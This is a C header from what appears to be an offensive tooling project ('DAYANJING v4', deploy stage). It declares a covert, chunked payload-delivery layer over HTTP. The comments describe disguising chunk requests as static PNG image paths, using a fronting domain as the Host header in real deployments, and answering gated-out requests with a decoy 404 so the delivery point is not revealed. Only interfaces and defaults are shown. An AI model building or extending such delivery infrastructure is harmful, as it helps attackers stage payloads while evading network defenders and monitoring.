/* DAYANJING v4 — 25_deploy / include/drop_http.h
 *
 * 分块投递的 HTTP 承载层接口。
 *
 * 默认常量只是形态默认值，部署时必须替换：
 *   DP_HTTP_PATH_TMPL —— 静态资源路径模板，须含且仅含一个 %u（块号）
 *   DP_HTTP_HOST      —— Host 头。真实部署用前置域（见 24_front）
 *   DP_HTTP_CTYPE     —— 响应 Content-Type，与路径后缀一致
 *
 * 刻意不内置 TLS：TLS 隧道由调用方以 read/write 回调注入，
 * 本层只处理隧道内的 HTTP 字节。
 */

#ifndef DROP_HTTP_H
#define DROP_HTTP_H

#include <stddef.h>
#include <stdint.h>

#include "drop.h"

/* 块号出现在路径里，形态与真实静态资源一致。 */
#define DP_HTTP_PATH_TMPL "/static/img/%u.png"
#define DP_HTTP_HOST      "static.local"
#define DP_HTTP_CTYPE     "image/png"

/* 构造 GET 请求。tmpl 为 NULL 时用默认模板。
   模板必须含且仅含一个 %u，否则返回 DP_ERR_ARG。 */
int dp_http_build_request(uint32_t idx, const char *tmpl,
                          char *out, size_t cap, size_t *olen);

/* 从 HTTP 请求里提取块号。取请求行路径中的第一段连续数字。
   路径无数字返回 DP_ERR_ARG（按"非投递请求"处理，回诱饵）。 */
int dp_http_parse_request(const char *req, size_t reqlen, uint32_t *idx);

/* 构造承载块的 200 响应。 */
int dp_http_build_response(const uint8_t *body, size_t blen,
                           const char *ctype,
                           uint8_t *out, size_t cap, size_t *olen);

/* 构造诱饵响应（404）。用于门控拒绝与不含块号的请求。
   用 404 而非 403：403 等于向来源确认投递点存在。 */
int dp_http_build_decoy(uint8_t *out, size_t cap, size_t *olen);

/* 解析响应，取出块体。
   校验三件事：状态码 200、有 Content-Length、声明长度与实际一致。
   任一不符返回错误 —— 把诱饵页当块收下会污染组装缓冲区。 */
int dp_http_parse_response(const uint8_t *resp, size_t rlen,
                           const uint8_t **body, size_t *blen);

#endif /* DROP_HTTP_H */
